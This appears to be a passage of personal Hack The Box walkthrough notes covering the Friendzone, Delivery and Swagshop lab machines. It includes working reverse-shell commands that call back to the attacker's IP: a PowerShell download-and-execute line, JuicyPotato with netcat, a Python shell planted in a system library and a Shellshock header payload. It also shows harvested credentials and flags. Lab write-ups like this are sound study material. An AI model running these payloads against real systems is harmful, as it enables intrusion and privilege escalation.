   Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 8000
   ```

10. I started a netcat listener, a webserver to host up the Poweshell script, then I issued the following command through the Laudanum webshell to get a reverse shell as the user `destitute`

    ```powershell
    # Webshell command
    cmd.exe /c powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.37/shell.ps1')
    ```

    ![image-20201120220213202](.Report.assets/image-20201120220213202.png)
    
11. I enumerated the system to find that this was running Windows 10 Enterprise x64 and I also found the user has SeImpersonate privileges as well.  

12. To exploit the seimpersonate privilege, I employed JuicyPotat.  I transferred the x64 version of this executable as well as a copy of netcat to the server, started a netcat listener, and used JuicyPotato to execute a reverse shell as SYSTEM

    ```powershell
    cmd.exe /c "JuicyPotato.exe -l 1337 -p c:\coyote\nc.exe -a "-nv 10.10.14.37 8000 -e cmd.exe" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
    ```

    ![image-20201121160149981](.Report.assets/image-20201121160149981.png)

13. From this shell, I was able to view the contents of the root.txt and user.txt files:
    ![image-20201121160213602](.Report.assets/image-20201121160213602.png)
    user.txt: 6E9FDFE0DCB66E700FB9CB824AE5A6FF
    root.txt: 5737DD2EDC29B5B219BC43E60866BE08

# 2021

## January

### 10.10.10.123 - Friendzone

1. Initial scans found an SMB share open with two shares that were readable, general and Development.  In the `general` share, there was a file called creds.txt with this:

   ```bash
   # creds.txt
   creds for the admin THING:
   
   admin:WORKWORKHhallelujah@#
   ```

2. This server was running http/https as well.  The http server showed a basic page with an email address of `info@friendzoneportal.red`, hinted at the domain name of the server.  The https server produced a 404 error for the index page.

3. I also found this target was running a DNS server.  I deduced the domain name of the server from the email address above and performed a zone transfer to get the following aliases for the server:

   ```bash
   host -l friendzoneportal.red 10.10.10.123
   # Output
   Using domain server:
   Name: 10.10.10.123
   Address: 10.10.10.123#53
   Aliases: 
   
   friendzoneportal.red has IPv6 address ::1
   friendzoneportal.red name server localhost.
   friendzoneportal.red has address 127.0.0.1
   admin.friendzoneportal.red has address 127.0.0.1
   files.friendzoneportal.red has address 127.0.0.1
   imports.friendzoneportal.red has address 127.0.0.1
   vpn.friendzoneportal.red has address 127.0.0.1
   ```

4. On my Kali machine, I modified my `/etc/hosts`  file to add the above aliases so I could access the webserver using those aliases.

   ```bash
   10.10.10.123    admin.friendzoneportal.red
   10.10.10.123    files.friendzoneportal.red
   10.10.10.123    imports.friendzoneportal.red
   10.10.10.123    vpn.friendzoneportal.red
   ```

5. Taking a cue from the creds.txt file, I visited the URL `https://admin.friendzoneportal.red/` and was presented with a login page.  After logging in with the creds above, it was a dead-end recommending that I check for another admin page.

6. I checked the domain name of the SSL certificate and found it was registered to `friendzone.red`.    I did a zone transfer for this domain and discovered more aliases that I added to my `/etc/hosts` file.

   ```bash
   host -l friendzone.red 10.10.10.123
   # Output
   Using domain server:
   Name: 10.10.10.123
   Address: 10.10.10.123#53
   Aliases: 
   
   friendzone.red has IPv6 address ::1
   friendzone.red name server localhost.
   friendzone.red has address 127.0.0.1
   administrator1.friendzone.red has address 127.0.0.1
   hr.friendzone.red has address 127.0.0.1
   uploads.friendzone.red has address 127.0.0.1
   ```

   ```bash
   #added to /etc/hosts
   10.10.10.123    administrator1.friendzone.red
   10.10.10.123    hr.friendzone.red
   10.10.10.123    uploads.friendzone.red
   ```

7. Visiting https://administrator1.friendzone.red/ brought me to another login page where I was able to login and was told to manually browse to https://administrator1.friendzone.red/dashboard.php after logging in.
   ![image-20210130202406446](.Report.assets/image-20210130202406446.png)

8. The Dashboard gave a clue that I could supply a parameter for the `image_id` and `pagename` variables due to sloppy programming.  I tested the `pagename` parameter using the URL `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp` which allowed me to see the timestamp code and note that it was appending `.php` to the end of whatever I supplied it.

9. I used the SMB server share `Development` to upload a phpinfo file named `test.php`.  From my scans, I found this server mapped to /etc/Development, so I uploaded the `test.php` to this share and visited this URL to find that it did indeed load the file, https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test

10. I used a copy of Pentestmonkey's PHP reverse shell script with my IP and port, uploaded it via Samba to the Development share.  I stated a netcat listener and then visited the URL above again, supplying the reverse shell script name this time `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell` which gave me a reverse shell as the www-data user.
    ![image-20210130215122624](.Report.assets/image-20210130215122624.png)

11. I spawned a tty prompt using Python.  From this shell, I was able to view the contents of the user.txt file:

    ![image-20210130215525479](.Report.assets/image-20210130215525479.png)
    user.txt:  a9ed20acecd6c5b6b52f474e15ae9a11

12. After checking for writeable files, I discovered I had write access to one of the Python libraries `/usr/lib/python2.7/os.py`.
    ![image-20210130221128874](.Report.assets/image-20210130221128874.png)

13. Searching for possible exploits led me to this page:  https://book.hacktricks.xyz/linux-unix/privilege-escalation which described a line of code that could be appended to the end of a library which would be executed along with any calls to the library.   I modified this code for my IP and port, then started a netcat listener and waited.

    ```bash
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.37",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
    ```

14. After a few minutes, I received a reverse shell as the root user.
    ![image-20210130221310009](.Report.assets/image-20210130221310009.png)

15. Using this shell, I was able to view the contents of the root.txt file:
    ![image-20210130221331080](.Report.assets/image-20210130221331080.png)
    root.txt:  b0e6c60b82cf96e9855ac1656a9e90c7



## February

### 10.10.10.222 - Delivery

1. Initial scans revealed a webserver running on ports 80 and 8065.  The webserver on port 80 gives a hint that the server has virtual domains, one of which is `helpdesk.delivery.htb`

2. I created entries in my `/etc/hosts` file to point these DNS entries to the machine IP:

   ```bash
   #/etc/hosts
   10.10.10.222    helpdesk.delivery.htb
   10.10.10.222    delivery.htb
   ```

3. Visiting the URL http://helpdesk.delivery.htb/ gives me access to the support center.  Opening a support ticket using any email with `delivery.htb` allows me to successfully open and view the ticket.  Opening a ticket also generated an email address named <ticketnumber>@delivery.htb.  
   ![image-20210203182354901](.Report.assets/image-20210203182354901.png)

4. On port 8065, there was a MatterMost server that requires a valid @delivery.htb email to sign up for.  I used the ticket email from my ticket to sign up for MattersMost, which sent an email to the ticketing system and caused the contents of the email to show up on the ticket.  From there, I was able to get the verification link and create a MattersMost account.
   ![image-20210207144218594](.Report.assets/image-20210207144218594.png)

5. After signing into MattersMost, I found a post with the server credentials listed as well as some clues that other passwords may be variations of `PleaseSubscribe!`.  
   ![image-20210207144323287](.Report.assets/image-20210207144323287.png)

6. After logging into the server via SSH, I was able to retrieve the user flag
   ![image-20210207144500162](.Report.assets/image-20210207144500162.png)
   user.txt:  a7d3e4d1879e7b1aab7868c2924c5c8c

7. I was able to obtain the MattersMost database username & password `mmuser:Crack_The_MM_Admin_PW` from `/opt/mattermost/config/config.json`
   ![image-20210207151955380](.Report.assets/image-20210207151955380.png)

8. With database access, I was able to dump the password hash of the root user on the database `$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO`
   ![image-20210207152504002](.Report.assets/image-20210207152504002.png)

9. Taking a cue from the hint earlier, I used hashcat to crack the password using forms of `PleaseSubscribe` and discovered the password was `PleaseSubscribe!21`

   ```bash
   hashcat --force -m 3200 --status -w3 -o found.txt --remove --potfile-disable -r ~/opt/wordlists/hashcat/rules/OneRuleToRuleThemAll.rule hash.txt wordlist.txt
   ```

10. Using this password, I was able to switch to the root user in my SSH prompt and get the root.txt flag:
    ![image-20210207171642721](.Report.assets/image-20210207171642721.png)
    root.txt:  84d1b566d7642dbfbadd97672e55b987

## March

### 10.10.10.140 - Swagshop

1. After enumerating the box, I discovered it was running a webserver.  Enumerating the webserver, I discovered the URL http://10.10.10.140/RELEASE_NOTES.txt which disclosed it was running Magento Commerce version 1.7.0.2.

2. I discovered a cron script that was publicly exposed on the server at URL http://10.10.10.140:80/cron.php

3. 12312

   ```bash
   GET /cron.php HTTP/1.1
   Host: 10.10.10.140
   User-Agent: () { :; } ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i |nc 10.10.14.37 8001 >/tmp/f
   
   
   GET /$(id)/cron.php HTTP/1.1
   Host: 10.10.10.140
   ```

   

4. Further enumeration discovered the URL http://10.10.10.140/app/etc/local.xml which had the following credentials:

   ```bash
   username: root
   password: fMVWh7bDHpgZkyfqQXreTjU9
   dbname: swagshop
   ```

   

### Chatterbox



### Forest



## Future